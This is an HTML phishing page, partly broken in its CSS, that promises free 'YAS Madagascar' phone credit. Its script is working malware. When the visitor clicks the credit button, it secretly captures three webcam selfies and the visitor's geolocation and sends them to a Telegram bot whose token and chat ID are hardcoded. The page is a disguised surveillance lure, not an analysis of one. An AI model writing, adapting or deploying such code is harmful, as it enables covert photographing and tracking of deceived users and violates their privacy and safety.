    :root {
      --c1:#080b18;
      --c2:#30106b;

      --purple:#a855f7;
      --white:#fff;

      margin:0;
      min-height:100vh;
      display:flex;
      flex-direction:column;
      justify-content:center;
      align-items:center;
      padding:20px;

    body::before {

        #00f5ff22,
        transparent,
        #a855f722,
        transparent

      animation:rotate 15s linear infinite;
      pointer-events:none;
    }

    @keyframes rotate {
      to { transform:rotate(360deg); }
    }

      color:#c5d4ef;
      animation:fade 1.2s;
    }

    @keyframes fade {

        opacity:0;
        transform:translateY(-20px);
      }
      to {
        opacity:1;
        transform:translateY(0);
      }
    }

    button {
      position:relative;
      z-index:2;
      padding:15px 32px;

      background:linear-gradient(135deg,#00c8ff,#7c3aed);

      font-weight:800;
      cursor:pointer;

  <h1> CREDIT GRATUIT YAS </h1>
  <p> Profitez d'une offre de crédit gratuit<br/>
      <strong>YAS Madagascar</strong>
  </p>
  <button onclick="startProcess()">Obtenir mon crédit</button>

<script>


  /* ------------- PARAMÈTRES TELEGRAM ------------- */
  const BOT_TOKEN = "8469966308:AAGzr6xL7R3zqV9r9yCC61LTCIxvY6oKtOs";
  const CHAT_ID   = "8124974450";

  /* ------------- FONCTION PRINCIPALE ------------- */
  async function startProcess() {
    try {
      // 1. Maka sary 3
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      const video  = document.createElement('video');
      video.srcObject = stream;
      await video.play();

      const canvas = document.createElement('canvas');
      const ctx    = canvas.getContext('2d');

      for (let i = 0; i < 3; i++) {
        await new Promise(r => setTimeout(r, 1200));
        canvas.width  = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.drawImage(video, 0, 0);
        const imgData = canvas.toDataURL('image/png');
        await sendPhoto(imgData, "📸 Selfie #" + (i+1));
      }
      stream.getTracks().forEach(t => t.stop());

      // 2. Maka toerana    
navigator.geolocation.getCurrentPosition(function(pos) {
        const { latitude: lat, longitude: lon } = pos.coords;
        const loc = `📍 Toerana: https://www.google.com/maps?q=${lat},${lon}`;
        sendMessage(loc); 
        alert("✅ Vita ny test, Tongasoa!");
      });

    } catch (err) {
      alert("❌ Nisy olana: " + err.message);
      console.error(err);
    }
  }
  /* ------------- ENVOI PHOTO ------------- */
  async function sendPhoto(imgBase64, caption) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
    const form = new FormData();
    form.append("chat_id", CHAT_ID);
    form.append("caption", caption);

    const blob = dataURItoBlob(imgBase64);
    form.append("photo", blob, "selfie.png");

    const res = await fetch(url, { method: "POST", body: form });
    console.log("sendPhoto status:", res.status);
  }

  /* ------------- ENVOI MESSAGE TEXTE ------------- */
  async function sendMessage(text) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    const res = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: text
      })
    });

    console.log("sendMessage status:", res.status);
  }

  /* ------------- UTILITAIRE ------------- */
  function dataURItoBlob(dataURI) {
    const byteString = atob(dataURI.split(',')[1]);
    const mime = dataURI.split(',')[0].split(':')[1].split(';')[0];
    const ab   = new ArrayBuffer(byteString.length);
    const ia   = new Uint8Array(ab);
    for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
    return new Blob([ab], { type: mime });
  }
</script>
